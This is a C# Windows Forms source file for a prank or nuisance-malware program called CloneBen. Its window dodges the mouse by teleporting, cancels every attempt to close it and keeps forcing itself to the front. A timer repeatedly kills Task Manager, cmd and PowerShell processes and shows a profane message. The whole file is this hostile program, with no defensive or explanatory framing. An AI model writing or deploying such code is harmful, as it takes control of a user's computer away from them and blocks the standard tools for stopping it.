using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace CloneBen
{
    public partial class CloneBen : Form
    {    
        readonly Random random = new Random();

        readonly int screenWidth;
        readonly int screenHeight;

        public CloneBen()
        {
            InitializeComponent();

            screenWidth = Screen.PrimaryScreen.Bounds.Width - this.Width;
            screenHeight = Screen.PrimaryScreen.Bounds.Height - this.Height;
        }

        private void Teleport()
        {
            int xPosition = random.Next(0, screenWidth);
            int yPosition = random.Next(0, screenHeight);
            this.Location = new Point(xPosition, yPosition);
        }

        private void CloneBen_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void CloneBen_MouseEnter(object sender, EventArgs e)
        {
            Teleport();
        }
        private void CloneBen_MouseMove(object sender, MouseEventArgs e)
        {
            Teleport();
        }
        private void CloneBen_MouseDown(object sender, MouseEventArgs e)
        {
            Teleport();
        }

        private void KillEnemy_Tick(object sender, EventArgs e)
        {
            foreach (var process in Process.GetProcesses())
            {
                var processName = process.ProcessName.ToLower();
                switch (processName)
                {
                    case "taskmgr":
                    case "cmd":
                    case "powershell":
                        process.Kill();
                        MessageBox.Show("Fuck", ":(");
                        break;
                }
            }
        }

        private void ShowBen_Tick(object sender, EventArgs e)
        {
            this.TopMost = true;
            this.Focus();
            this.BringToFront();
            this.TopMost = false;
        }
    }
}


